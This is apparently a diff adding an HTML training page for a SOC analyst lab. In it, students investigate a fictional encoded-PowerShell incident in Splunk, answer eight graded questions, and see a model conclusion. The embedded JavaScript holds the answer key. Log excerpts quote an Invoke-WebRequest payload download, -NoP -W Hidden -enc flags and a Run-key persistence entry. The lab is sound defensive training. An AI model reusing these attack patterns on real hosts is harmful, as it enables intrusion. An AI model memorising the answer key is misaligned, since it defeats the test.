@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SOC L1 Investigation Console | INC-2026-0819</title>
+  <style>
+    :root {
+      --bg-app: #090d16;
+      --bg-panel: #111827;
+      --bg-card: #182234;
+      --bg-code: #060911;
+      --border: #26344d;
+      --text-main: #e5edf8;
+      --text-dim: #94a3b8;
+      --text-muted: #64748b;
+      --accent-blue: #38bdf8;
+      --accent-cyan: #2dd4bf;
+      --accent-green: #22c55e;
+      --accent-amber: #f59e0b;
+      --accent-red: #ef4444;
+      --accent-violet: #a78bfa;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--bg-app);
+      color: var(--text-main);
+      line-height: 1.6;
+      padding-bottom: 64px;
+    }
+
+    header {
+      background: linear-gradient(180deg, #121b2e 0%, #0b111e 100%);
+      border-bottom: 1px solid var(--border);
+      padding: 18px 28px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.45);
+    }
+
+    .header-wrap {
+      max-width: 1220px;
+      margin: 0 auto;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .brand-group {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .tag-soc {
+      background: rgba(56, 189, 248, 0.14);
+      border: 1px solid var(--accent-blue);
+      color: var(--accent-blue);
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .brand-group h1 {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #f8fafc;
+    }
+
+    .status-strip {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      align-items: center;
+    }
+
+    .chip {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 5px 12px;
+      font-size: 0.82rem;
+      color: var(--text-dim);
+    }
+
+    .chip strong {
+      color: var(--text-main);
+    }
+
+    .chip.score {
+      border-color: var(--accent-cyan);
+      color: var(--accent-cyan);
+    }
+
+    main {
+      max-width: 1220px;
+      margin: 26px auto;
+      padding: 0 22px;
+      display: flex;
+      flex-direction: column;
+      gap: 22px;
+    }
+
+    .panel {
+      background: var(--bg-panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 24px;
+    }
+
+    .panel-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 12px;
+      margin-bottom: 18px;
+    }
+
+    .panel-title {
+      font-size: 1rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--accent-blue);
+    }
+
+    .ticket-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 14px;
+      margin-bottom: 16px;
+    }
+
+    .t-box {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 11px 14px;
+    }
+
+    .t-label {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      color: var(--text-muted);
+      margin-bottom: 3px;
+    }
+
+    .t-val {
+      font-family: "Consolas", "Courier New", monospace;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--text-main);
+    }
+
+    .sev-high {
+      color: var(--accent-amber);
+    }
+
+    .t-desc {
+      background: var(--bg-code);
+      border-left: 3px solid var(--accent-amber);
+      padding: 14px 16px;
+      border-radius: 0 6px 6px 0;
+      font-size: 0.92rem;
+      color: var(--text-main);
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(430px, 1fr));
+      gap: 22px;
+    }
+
+    ul.guide-list {
+      margin-left: 20px;
+      color: var(--text-dim);
+      font-size: 0.92rem;
+    }
+
+    ul.guide-list li {
+      margin-bottom: 8px;
+    }
+
+    ul.guide-list li strong {
+      color: var(--text-main);
+    }
+
+    code {
+      font-family: "Consolas", "Courier New", monospace;
+      color: #7dd3fc;
+      font-size: 0.88em;
+    }
+
+    .spl-snippet {
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 10px 12px;
+      margin: 8px 0 14px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      overflow-x: auto;
+    }
+
+    .spl-snippet code {
+      color: #67e8f9;
+      font-size: 0.84rem;
+      white-space: nowrap;
+    }
+
+    .btn-copy {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      color: var(--text-dim);
+      padding: 4px 10px;
+      border-radius: 4px;
+      font-size: 0.75rem;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .btn-copy:hover {
+      border-color: var(--accent-blue);
+      color: var(--text-main);
+    }
+
+    .q-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 18px 20px;
+      margin-bottom: 16px;
+    }
+
+    .q-card.q-correct {
+      border-color: var(--accent-green);
+    }
+
+    .q-card.q-wrong {
+      border-color: var(--accent-red);
+    }
+
+    .q-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+
+    .q-text {
+      font-size: 0.98rem;
+      font-weight: 600;
+      color: #f8fafc;
+    }
+
+    .q-pts {
+      background: rgba(56, 189, 248, 0.14);
+      border: 1px solid rgba(56, 189, 248, 0.35);
+      color: var(--accent-blue);
+      font-size: 0.78rem;
+      font-weight: 700;
+      padding: 2px 10px;
+      border-radius: 12px;
+      white-space: nowrap;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      color: var(--text-main);
+      padding: 10px 14px;
+      border-radius: 6px;
+      font-family: "Consolas", "Courier New", monospace;
+      font-size: 0.92rem;
+    }
+
+    input[type="text"]:focus {
+      outline: none;
+      border-color: var(--accent-blue);
+    }
+
+    .hint-bar {
+      margin-top: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .btn-hint {
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--accent-amber);
+      padding: 5px 12px;
+      border-radius: 5px;
+      font-size: 0.8rem;
+      cursor: pointer;
+    }
+
+    .btn-hint:hover:not(:disabled) {
+      background: rgba(245, 158, 11, 0.1);
+    }
+
+    .btn-hint:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    .hints-list {
+      margin-top: 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .hint-item {
+      background: rgba(245, 158, 11, 0.08);
+      border-left: 3px solid var(--accent-amber);
+      padding: 8px 12px;
+      border-radius: 0 4px 4px 0;
+      font-size: 0.86rem;
+      color: #fde68a;
+    }
+
+    .q-review {
+      display: none;
+      margin-top: 14px;
+      padding-top: 12px;
+      border-top: 1px dashed var(--border);
+      font-size: 0.88rem;
+    }
+
+    .badge-ok {
+      display: inline-block;
+      background: rgba(34, 197, 94, 0.15);
+      color: var(--accent-green);
+      border: 1px solid var(--accent-green);
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 0.76rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .badge-err {
+      display: inline-block;
+      background: rgba(239, 68, 68, 0.15);
+      color: var(--accent-red);
+      border: 1px solid var(--accent-red);
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 0.76rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .rev-line {
+      margin-bottom: 6px;
+      color: var(--text-dim);
+    }
+
+    .rev-line strong {
+      color: var(--text-main);
+    }
+
+    .controls-row {
+      display: flex;
+      gap: 14px;
+      flex-wrap: wrap;
+      margin-top: 8px;
+    }
+
+    .btn-submit {
+      background: var(--accent-blue);
+      color: #07101d;
+      border: none;
+      padding: 12px 24px;
+      font-size: 0.94rem;
+      font-weight: 700;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .btn-submit:hover {
+      opacity: 0.92;
+    }
+
+    .btn-reset {
+      background: var(--bg-card);
+      color: var(--text-main);
+      border: 1px solid var(--border);
+      padding: 12px 20px;
+      font-size: 0.94rem;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .btn-reset:hover {
+      border-color: var(--text-dim);
+    }
+
+    #results-section, #conclusion-section {
+      display: none;
+    }
+
+    .summary-banner {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 18px 22px;
+      margin-bottom: 14px;
+    }
+
+    .score-num {
+      font-size: 2rem;
+      font-weight: 800;
+      color: var(--accent-cyan);
+    }
+
+    .verdict-pill {
+      padding: 6px 14px;
+      border-radius: 6px;
+      font-weight: 700;
+      font-size: 0.92rem;
+    }
+
+    .verdict-pass {
+      background: rgba(34, 197, 94, 0.15);
+      color: var(--accent-green);
+      border: 1px solid var(--accent-green);
+    }
+
+    .verdict-fail {
+      background: rgba(239, 68, 68, 0.15);
+      color: var(--accent-red);
+      border: 1px solid var(--accent-red);
+    }
+
+    .conc-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(270px, 1fr));
+      gap: 14px;
+      margin-bottom: 16px;
+    }
+
+    .conc-box {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 14px;
+    }
+
+    .conc-box h4 {
+      color: var(--accent-cyan);
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 6px;
+    }
+
+    .conc-box p, .conc-box ul {
+      font-size: 0.9rem;
+      color: var(--text-main);
+    }
+
+    .conc-box ul {
+      margin-left: 18px;
+    }
+
+    @media (max-width: 560px) {
+      .grid-2 {
+        grid-template-columns: 1fr;
+      }
+      header {
+        padding: 14px 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-wrap">
+    <div class="brand-group">
+      <span class="tag-soc">SOC L1 Lab</span>
+      <h1>Suspicious PowerShell Activity (T1059.001)</h1>
+    </div>
+    <div class="status-strip">
+      <div class="chip">Incident: <strong>INC-2026-0819</strong></div>
+      <div class="chip">Difficulty: <strong>Medium</strong></div>
+      <div class="chip">Est. Time: <strong>35–45 mins</strong></div>
+      <div class="chip score">Score: <strong id="top-score">0 / 100</strong></div>
+    </div>
+  </div>
+</header>
+
+<main>
+  <section class="panel">
+    <div class="panel-head">
+      <div class="panel-title">01 // Mission Brief</div>
+    </div>
+    <p style="color: var(--text-dim); margin-bottom: 10px;">
+      You are a Tier 1 SOC Analyst for <strong style="color: var(--text-main);">Harborline Freight &amp; Logistics</strong>. An endpoint detection rule fired on a corporate workstation after observing an encoded PowerShell command line followed by downstream host and network activity.
+    </p>
+    <p style="color: var(--text-dim);">
+      <strong style="color: var(--text-main);">Analyst Objective:</strong> Load the provided JSONL log dataset into <code>index=soc</code> in Splunk Enterprise, correlate endpoint telemetry (Sysmon, PowerShell script blocks, Windows Security) with network/DNS/proxy logs, separate benign administrative tasks from malicious behavior, answer all 8 investigation questions, and complete your incident conclusion.
+    </p>
+  </section>
+
+  <section class="panel">
+    <div class="panel-head">
+      <div class="panel-title">02 // SOC Alert Ticket</div>
+      <span class="chip" style="border-color: var(--accent-amber); color: var(--accent-amber);">Priority: High</span>
+    </div>
+    <div class="ticket-grid">
+      <div class="t-box">
+        <div class="t-label">Incident ID</div>
+        <div class="t-val">INC-2026-0819</div>
+      </div>
+      <div class="t-box">
+        <div class="t-label">Alert Name</div>
+        <div class="t-val">Encoded PowerShell Execution</div>
+      </div>
+      <div class="t-box">
+        <div class="t-label">Severity</div>
+        <div class="t-val sev-high">HIGH</div>
+      </div>
+      <div class="t-box">
+        <div class="t-label">Detection Source</div>
+        <div class="t-val">EDR / Sysmon Behavioral Rule</div>
+      </div>
+      <div class="t-box">
+        <div class="t-label">Alert Timestamp (UTC)</div>
+        <div class="t-val">2026-11-20T15:14:08Z</div>
+      </div>
+      <div class="t-box">
+        <div class="t-label">Affected Host / User</div>
+        <div class="t-val">WKSTN-OPS-018 / HARBORLINE\k.bennett</div>
+      </div>
+      <div class="t-box">
+        <div class="t-label">Initial Indicators</div>
+        <div class="t-val">powershell.exe -enc, PID 6120</div>
+      </div>
+      <div class="t-box">
+        <div class="t-label">Investigation Window</div>
+        <div class="t-val">2026-11-20 15:00:00Z – 16:00:00Z</div>
+      </div>
+    </div>
+    <div class="t-desc">
+      <strong>Initial Alert Description:</strong> A detection rule triggered on workstation <code>WKSTN-OPS-018</code> (<code>10.40.22.58</code>) under user <code>HARBORLINE\k.bennett</code> for <code>powershell.exe</code> (PID <code>6120</code>) launched with Base64-encoded arguments. Investigate the execution chain, script block contents, external network connections, persistence mechanisms, and any related internal or external activity during the one-hour window.
+    </div>
+  </section>
+
+  <div class="grid-2">
+    <section class="panel">
+      <div class="panel-head">
+        <div class="panel-title">03 // Splunk Ingestion &amp; Setup</div>
+      </div>
+      <ul class="guide-list">
+        <li><strong>Index:</strong> Ingest logs into <code>index=soc</code>.</li>
+        <li><strong>Source Type:</strong> Upload the JSONL file via <em>Settings &rarr; Add Data &rarr; Upload</em> with sourcetype <code>_json</code>.</li>
+        <li><strong>Investigation Window:</strong> Filter between <code>2026-11-20 15:00:00</code> and <code>2026-11-20 16:00:00</code> UTC (or <em>All Time</em>).</li>
+        <li><strong>Log Sources in Dataset:</strong> <code>sysmon</code>, <code>powershell</code>, <code>wineventlog:security</code>, <code>dns</code>, <code>proxy</code>, <code>firewall</code>.</li>
+      </ul>
+    </section>
+
+    <section class="panel">
+      <div class="panel-head">
+        <div class="panel-title">04 // Useful Starting Searches</div>
+      </div>
+      <p style="font-size: 0.86rem; color: var(--text-dim);">Summarize available log sources and event types:</p>
+      <div class="spl-snippet">
+        <code>index=soc | stats count by source, event_type</code>
+        <button class="btn-copy" onclick="copyQuery(this)">Copy</button>
+      </div>
+      <p style="font-size: 0.86rem; color: var(--text-dim);">Chronological view of events on WKSTN-OPS-018:</p>
+      <div class="spl-snippet">
+        <code>index=soc host="WKSTN-OPS-018" | sort _time | table _time source event_type user process_name command_line</code>
+        <button class="btn-copy" onclick="copyQuery(this)">Copy</button>
+      </div>
+    </section>
+  </div>
+
+  <section class="panel">
+    <div class="panel-head">
+      <div class="panel-title">05 // Investigation Questions (100 Points)</div>
+      <span style="font-size: 0.85rem; color: var(--text-dim);">Passing score: 75 / 100</span>
+    </div>
+    <div id="questions-root"></div>
+    <div class="controls-row">
+      <button class="btn-submit" id="btn-grade" onclick="submitInvestigation()">Submit &amp; Grade Investigation</button>
+      <button class="btn-reset" onclick="resetInvestigation()">Reset Lab</button>
+    </div>
+  </section>
+
+  <section class="panel" id="results-section">
+    <div class="panel-head">
+      <div class="panel-title">06 // Grading Summary &amp; Feedback</div>
+    </div>
+    <div class="summary-banner">
+      <div>
+        <div style="font-size: 0.78rem; color: var(--text-dim); text-transform: uppercase;">Total Score</div>
+        <div class="score-num" id="res-score">0 / 100</div>
+      </div>
+      <div id="res-verdict" class="verdict-pill">PENDING</div>
+      <p id="res-feedback" style="max-width: 540px; font-size: 0.9rem; color: var(--text-dim);"></p>
+    </div>
+    <p style="font-size: 0.88rem; color: var(--text-dim);">
+      Detailed explanations, log evidence, and recommended SPL queries are displayed under each question above.
+    </p>
+  </section>
+
+  <section class="panel" id="conclusion-section">
+    <div class="panel-head">
+      <div class="panel-title">07 // Model SOC Analyst Conclusion</div>
+      <span class="badge-err" style="margin: 0;">TRUE POSITIVE — MALICIOUS</span>
+    </div>
+    <div class="conc-grid">
+      <div class="conc-box">
+        <h4>Classification</h4>
+        <p><strong>True Positive (Malicious)</strong> — Malicious PowerShell Execution (T1059.001) leading to remote payload staging, C2 beaconing, Run-key persistence, and an unsuccessful SMB lateral movement attempt.</p>
+      </div>
+      <div class="conc-box">
+        <h4>MITRE ATT&amp;CK</h4>
+        <ul>
+          <li><strong>T1204.002</strong> – Malicious File (<code>Shipment_Manifest_9042.hta</code>)</li>
+          <li><strong>T1059.001</strong> – Command and Scripting Interpreter: PowerShell</li>
+          <li><strong>T1547.001</strong> – Registry Run Keys / Startup Folder</li>
+          <li><strong>T1021.002</strong> – SMB/Windows Admin Shares</li>
+        </ul>
+      </div>
+      <div class="conc-box">
+        <h4>Scope &amp; Impact</h4>
+        <ul>
+          <li><strong>Affected Host:</strong> WKSTN-OPS-018 (10.40.22.58)</li>
+          <li><strong>Affected Account:</strong> HARBORLINE\k.bennett</li>
+          <li><strong>Targeted Host:</strong> APP-SRV-01 (10.40.12.20) — Logon failed (Access Denied)</li>
+        </ul>
+      </div>
+    </div>
+    <div class="conc-box" style="margin-bottom: 14px;">
+      <h4>Incident Summary &amp; Timeline</h4>
+      <p style="margin-bottom: 8px;">
+        At <strong>15:13:42Z</strong>, user <code>k.bennett</code> launched <code>Shipment_Manifest_9042.hta</code> via <code>mshta.exe</code> (PID 5804) from <code>C:\Users\k.bennett\Downloads</code>. At <strong>15:14:08Z</strong>, <code>mshta.exe</code> spawned an obfuscated <code>powershell.exe</code> process (PID <code>6120</code>) with flags <code>-NoP -NonI -W Hidden -enc</code>.
+      </p>
+      <p style="margin-bottom: 8px;">
+        PowerShell Script Block Logging (Event ID 4104 at 15:14:10Z) captured the decoded command downloading <code>fleet_agent.exe</code> from <code>http://pkg-mirror-sync.net/dl/fleet_agent.exe</code> (resolved to <code>198.51.100.88</code>) into <code>C:\Users\k.bennett\AppData\Local\Temp\fleet_agent.exe</code> and executing it (PID <code>6340</code>).
+      </p>
+      <p>
+        At <strong>15:14:45Z</strong>, <code>fleet_agent.exe</code> added the HKCU Run persistence entry <code>FleetTelemetrySvc</code>. Between <strong>15:15:30Z</strong> and <strong>15:57:30Z</strong>, it beaconed over TCP/443 to <code>198.51.100.88</code>. At <strong>15:22:14Z</strong>, it attempted an SMB connection (port 445) to <code>APP-SRV-01</code> (<code>10.40.12.20</code>), which failed with Windows Security Event ID <code>4625</code> (<code>0xC0000022</code>). Earlier PowerShell activity by <code>svc_patch</code> on <code>WKSTN-OPS-018</code> and <code>WKSTN-HR-004</code> at 15:04Z was verified as benign patch-compliance auditing.
+      </p>
+    </div>
+    <div class="conc-box">
+      <h4>Recommended Response</h4>
+      <ul>
+        <li>Isolate <code>WKSTN-OPS-018</code> from the network via EDR containment.</li>
+        <li>Reset credentials and invalidate active sessions for <code>HARBORLINE\k.bennett</code>.</li>
+        <li>Block <code>pkg-mirror-sync.net</code> and <code>198.51.100.88</code> on the firewall, proxy, and DNS resolver; remove the <code>FleetTelemetrySvc</code> Run key and quarantine <code>fleet_agent.exe</code> and <code>Shipment_Manifest_9042.hta</code>.</li>
+        <li>Escalate to Tier 2 IR for full host forensics and verification that <code>APP-SRV-01</code> was not compromised.</li>
+      </ul>
+    </div>
+  </section>
+</main>
+
+<script>
+  const QUESTIONS = [
+    {
+      id: "q1",
+      points: 10,
+      prompt: "1. What parent process spawned the suspicious powershell.exe (PID 6120) on WKSTN-OPS-018?",
+      placeholder: "e.g., explorer.exe",
+      hints: [
+        "Filter Sysmon ProcessCreate (event_id=1) on WKSTN-OPS-018 for process_id=6120.",
+        "Inspect the parent_process_name field on the powershell.exe creation event at 15:14:08Z.",
+        "The process executes an HTML Application (.hta) file just before PowerShell starts."
+      ],
+      accepted: ["mshta.exe", "c:\\windows\\system32\\mshta.exe", "mshta"],
+      answerDisplay: "mshta.exe",
+      explanation: "Sysmon Event ID 1 at 15:14:08Z shows mshta.exe (PID 5804) spawning powershell.exe (PID 6120) after opening Shipment_Manifest_9042.hta.",
+      evidence: "2026-11-20T15:14:08Z | source=sysmon | event_id=1 | host=WKSTN-OPS-018 | parent_process_name=mshta.exe | process_name=powershell.exe | process_id=6120",
+      spl: "index=soc source=\"sysmon\" host=\"WKSTN-OPS-018\" process_id=6120 | table _time user parent_process_name process_name command_line"
+    },
+    {
+      id: "q2",
+      points: 10,
+      prompt: "2. What is the filename of the malicious HTA file opened by the parent process prior to PowerShell execution?",
+      placeholder: "e.g., update.hta",
+      hints: [
+        "Check Sysmon ProcessCreate (event_id=1) on WKSTN-OPS-018 for mshta.exe around 15:13:42Z.",
+        "Look at the command_line field of mshta.exe to see which file path was passed as an argument.",
+        "The filename references a shipment manifest."
+      ],
+      accepted: ["shipment_manifest_9042.hta", "c:\\users\\k.bennett\\downloads\\shipment_manifest_9042.hta"],
+      answerDisplay: "Shipment_Manifest_9042.hta",
+      explanation: "At 15:13:42Z, mshta.exe was launched with C:\\Users\\k.bennett\\Downloads\\Shipment_Manifest_9042.hta, which then spawned the encoded PowerShell command.",
+      evidence: "2026-11-20T15:13:42Z | source=sysmon | event_id=1 | host=WKSTN-OPS-018 | process_name=mshta.exe | command_line=\"C:\\Windows\\System32\\mshta.exe\" \"C:\\Users\\k.bennett\\Downloads\\Shipment_Manifest_9042.hta\"",
+      spl: "index=soc source=\"sysmon\" host=\"WKSTN-OPS-018\" process_name=\"mshta.exe\" | table _time user parent_process_name command_line"
+    },
+    {
+      id: "q3",
+      points: 15,
+      prompt: "3. Which external domain did the PowerShell script block target to download the secondary payload?",
+      placeholder: "e.g., example-c2.com",
+      hints: [
+        "Examine PowerShell Script Block Logging (source=powershell, event_id=4104) or DNS queries from WKSTN-OPS-018.",
+        "Look at script_block_text for process_id=6120 at 15:14:10Z.",
+        "The domain mimics a package mirror sync service."
+      ],
+      accepted: ["pkg-mirror-sync.net", "http://pkg-mirror-sync.net", "http://pkg-mirror-sync.net/dl/fleet_agent.exe"],
+      answerDisplay: "pkg-mirror-sync.net",
+      explanation: "PowerShell Event ID 4104 at 15:14:10Z records Invoke-WebRequest fetching http://pkg-mirror-sync.net/dl/fleet_agent.exe, matching the DNS A query at 15:14:11Z.",
+      evidence: "2026-11-20T15:14:10Z | source=powershell | event_id=4104 | script_block_text=\"Invoke-WebRequest -Uri 'http://pkg-mirror-sync.net/dl/fleet_agent.exe' ...\"",
+      spl: "index=soc host=\"WKSTN-OPS-018\" (source=\"powershell\" OR source=\"dns\") | table _time source query script_block_text"
+    },
+    {
+      id: "q4",
+      points: 15,
+      prompt: "4. What is the full path (or filename) of the secondary executable dropped and launched by powershell.exe?",
+      placeholder: "e.g., C:\\Users\\Public\\agent.exe",
+      hints: [
+        "Check Sysmon FileCreate (event_id=11) or ProcessCreate (event_id=1) where parent_process_id=6120.",
+        "Look at the -OutFile path in PowerShell Event ID 4104 or the image_path of the child executable.",
+        "The executable is placed inside k.bennett's AppData\\Local\\Temp folder."
+      ],
+      accepted: [
+        "c:\\users\\k.bennett\\appdata\\local\\temp\\fleet_agent.exe",
+        "fleet_agent.exe",
+        "\\users\\k.bennett\\appdata\\local\\temp\\fleet_agent.exe"
+      ],
+      answerDisplay: "C:\\Users\\k.bennett\\AppData\\Local\\Temp\\fleet_agent.exe (fleet_agent.exe)",
+      explanation: "PowerShell (PID 6120) wrote fleet_agent.exe to C:\\Users\\k.bennett\\AppData\\Local\\Temp\\fleet_agent.exe (Event ID 11 at 15:14:13Z) and executed it as PID 6340 (Event ID 1 at 15:14:14Z).",
+      evidence: "2026-11-20T15:14:14Z | source=sysmon | event_id=1 | parent_process_id=6120 | process_id=6340 | process_name=fleet_agent.exe | image_path=C:\\Users\\k.bennett\\AppData\\Local\\Temp\\fleet_agent.exe",
+      spl: "index=soc source=\"sysmon\" host=\"WKSTN-OPS-018\" parent_process_id=6120 | table _time event_id process_name image_path target_filename"
+    },
+    {
+      id: "q5",
+      points: 15,
+      prompt: "5. What external C2 IP address did fleet_agent.exe communicate with over TCP port 443?",
+      placeholder: "e.g., 203.0.113.10",
+      hints: [
+        "Filter Sysmon NetworkConnect (event_id=3) or firewall logs for dest_port=443 from WKSTN-OPS-018 (10.40.22.58).",
+        "Look for repeated outbound connections by fleet_agent.exe (PID 6340) starting around 15:15:30Z.",
+        "This IP is also returned by DNS for pkg-mirror-sync.net."
+      ],
+      accepted: ["198.51.100.88"],
+      answerDisplay: "198.51.100.88",
+      explanation: "Sysmon Event ID 3 and firewall traffic logs show fleet_agent.exe (PID 6340) making regular outbound TCP/443 connections to 198.51.100.88 throughout the window.",
+      evidence: "2026-11-20T15:15:30Z | source=sysmon | event_id=3 | process_name=fleet_agent.exe | src_ip=10.40.22.58 | dest_ip=198.51.100.88 | dest_port=443",
+      spl: "index=soc host=\"WKSTN-OPS-018\" (source=\"sysmon\" event_id=3 OR source=\"firewall\") dest_port=443 | stats count by process_name dest_ip dest_port"
+    },
+    {
+      id: "q6",
+      points: 10,
+      prompt: "6. What registry value name was created under the CurrentVersion\\Run key for persistence?",
+      placeholder: "e.g., UpdaterService",
+      hints: [
+        "Search Sysmon RegistryEvent (event_id=13) on WKSTN-OPS-018 for CurrentVersion\\Run.",
+        "Look at the target_object and details fields around 15:14:45Z.",
+        "The value name references fleet telemetry."
+      ],
+      accepted: ["fleettelemetrysvc"],
+      answerDisplay: "FleetTelemetrySvc",
+      explanation: "At 15:14:45Z, Sysmon Event ID 13 records fleet_agent.exe (PID 6340) writing value FleetTelemetrySvc pointing to C:\\Users\\k.bennett\\AppData\\Local\\Temp\\fleet_agent.exe under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FleetTelemetrySvc.",
+      evidence: "2026-11-20T15:14:45Z | source=sysmon | event_id=13 | process_name=fleet_agent.exe | target_object=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FleetTelemetrySvc",
+      spl: "index=soc source=\"sysmon\" host=\"WKSTN-OPS-018\" event_id=13 | table _time process_name target_object details"
+    },
+    {
+      id: "q7",
+      points: 15,
+      prompt: "7. Correlate network and authentication logs: which internal host was targeted over SMB (port 445) from WKSTN-OPS-018, and was the logon successful or failed? (Format: HOSTNAME - Failed/Successful)",
+      placeholder: "e.g., FILE-SRV-02 - Failed",
+      hints: [
+        "Check Sysmon Event ID 3 on WKSTN-OPS-018 for dest_port=445 after 15:20Z.",
+        "Pivot on the destination IP or host in wineventlog:security for logon events (4624 or 4625) from 10.40.22.58.",
+        "The target host is APP-SRV-01 (10.40.12.20). Inspect the status code on event_id=4625."
+      ],
+      accepted: [
+        "app-srv-01 - failed",
+        "app-srv-01 failed",
+        "app-srv-01 (10.40.12.20) - failed",
+        "app-srv-01, failed",
+        "10.40.12.20 - failed",
+        "app-srv-01 - unsuccessful"
+      ],
+      answerDisplay: "APP-SRV-01 (10.40.12.20) - Failed",
+      explanation: "At 15:22:14Z, fleet_agent.exe connected to 10.40.12.20 (APP-SRV-01) on port 445. Windows Security Event ID 4625 on APP-SRV-01 at 15:22:15Z shows a failed Logon Type 3 attempt for HARBORLINE\\k.bennett with status 0xC0000022 (Access Denied).",
+      evidence: "2026-11-20T15:22:15Z | source=wineventlog:security | host=APP-SRV-01 | event_id=4625 | user=HARBORLINE\\k.bennett | src_ip=10.40.22.58 | status=0xC0000022",
+      spl: "index=soc (dest_port=445 OR event_id=4625 OR event_id=4624) src_ip=\"10.40.22.58\" | table _time host source event_id user src_ip dest_ip status"
+    },
+    {
+      id: "q8",
+      points: 10,
+      prompt: "8. At 15:04:10Z, powershell.exe ran on WKSTN-OPS-018 under HARBORLINE\\svc_patch. Was this activity malicious or benign?",
+      placeholder: "e.g., Benign",
+      hints: [
+        "Inspect the command_line and parent_process_name for HARBORLINE\\svc_patch at 15:04:10Z.",
+        "Look for similar PowerShell executions under svc_patch on other workstations in the dataset.",
+        "A patch-compliance script launched by an endpoint management service across multiple hosts is routine administration."
+      ],
+      accepted: ["benign", "legitimate", "false positive", "benign administrative activity", "normal"],
+      answerDisplay: "Benign (Routine patch-compliance check via svc_patch)",
+      explanation: "At 15:04:10Z, PatchAgentSvc.exe executed C:\\ProgramData\\HarborlinePatch\\Check-PatchCompliance.ps1 under HARBORLINE\\svc_patch on WKSTN-OPS-018 and WKSTN-HR-004. This is normal administrative activity rather than part of the incident.",
+      evidence: "2026-11-20T15:04:10Z | source=sysmon | host=WKSTN-OPS-018 | user=HARBORLINE\\svc_patch | parent_process_name=PatchAgentSvc.exe | command_line=powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\HarborlinePatch\\Check-PatchCompliance.ps1",
+      spl: "index=soc user=\"*svc_patch*\" | table _time host parent_process_name process_name command_line"
+    }
+  ];
+
+  const hintCounts = {};
+
+  function renderQuestions() {
+    const root = document.getElementById("questions-root");
+    root.innerHTML = "";
+    QUESTIONS.forEach((q) => {
+      hintCounts[q.id] = 0;
+      const card = document.createElement("div");
+      card.className = "q-card";
+      card.id = "qcard-" + q.id;
+      card.innerHTML = `
+        <div class="q-top">
+          <div class="q-text">${q.prompt}</div>
+          <div class="q-pts">${q.points} pts</div>
+        </div>
+        <input type="text" id="ans-${q.id}" placeholder="${q.placeholder}" autocomplete="off" />
+        <div class="hint-bar">
+          <button type="button" class="btn-hint" id="hbtn-${q.id}" onclick="showNextHint('${q.id}')">
+            Show Hint (0/${q.hints.length})
+          </button>
+        </div>
+        <div class="hints-list" id="hlist-${q.id}"></div>
+        <div class="q-review" id="rev-${q.id}"></div>
+      `;
+      root.appendChild(card);
+    });
+  }
+
+  function showNextHint(qid) {
+    const q = QUESTIONS.find((item) => item.id === qid);
+    if (!q) return;
+    const idx = hintCounts[qid] || 0;
+    if (idx >= q.hints.length) return;
+
